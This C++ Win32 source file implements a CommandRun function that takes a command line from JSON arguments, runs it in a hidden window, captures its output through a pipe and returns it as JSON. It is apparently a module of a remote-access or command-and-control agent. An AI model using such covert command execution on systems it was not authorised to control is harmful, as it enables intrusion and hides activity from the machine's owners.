#include "Command.h"

BOOL CommandRun(json& args, string artifact, json& result) {
    string              commandline = args[0].get<string>();
    HANDLE              hPipeRead;
    HANDLE              hPipeWrite;
    SECURITY_ATTRIBUTES sa;
    STARTUPINFOA        si;
    PROCESS_INFORMATION pi;
    DWORD               total = 0;    
    DWORD               capacity = 4096;
    CHAR                temp[1024];
    DWORD               bytesread;

    sa.nLength = sizeof(SECURITY_ATTRIBUTES);
    sa.bInheritHandle = TRUE;
    sa.lpSecurityDescriptor = NULL;


    if (!CreatePipe(&hPipeRead, &hPipeWrite, &sa, 0)) {
        printf("[-] CreatePipe failed: ( %d )\n", GetLastError());
        return FALSE;
    }

    if (!SetHandleInformation(hPipeRead, HANDLE_FLAG_INHERIT, 0)) {
        printf("[-] SetHandleInformation failed: ( %d )\n", GetLastError());
        return FALSE;
    }

    ZeroMemory(&si, sizeof(si));
    ZeroMemory(&pi, sizeof(pi));
    si.cb = sizeof(si);
    si.hStdError = hPipeWrite;
    si.hStdOutput = hPipeWrite;
    si.dwFlags |= STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;

    if (!CreateProcessA(NULL, (char*)commandline.c_str(), NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi)) {
        printf("CreateProcess failed: ( %d )\n", GetLastError());
        CloseHandle(hPipeRead);
        CloseHandle(hPipeWrite);
        return FALSE;
    }

    CloseHandle(hPipeWrite);

    char* output = (char*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, capacity);
    if (!output) {
        CloseHandle(hPipeRead);
        return FALSE;
    }
    output[0] = '\0';

    while (ReadFile(hPipeRead, temp, sizeof(temp) - 1, &bytesread, NULL) && bytesread > 0) {
        if (total + bytesread + 1 > capacity) {
            capacity *= 2;
            char* newOutput = (char*)HeapReAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, output, capacity);
            if (!newOutput) {
                HeapFree(GetProcessHeap(), 0, output);
                CloseHandle(hPipeRead);
                return FALSE;
            }
            output = newOutput;
        }

        memcpy(output + total, temp, bytesread);
        total += bytesread;
        output[total] = '\0';
    }

    WaitForSingleObject(pi.hProcess, INFINITE);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    CloseHandle(hPipeRead);
    
    result["output"] = output;    
    HeapFree(GetProcessHeap(), 0, output);
    return TRUE;
}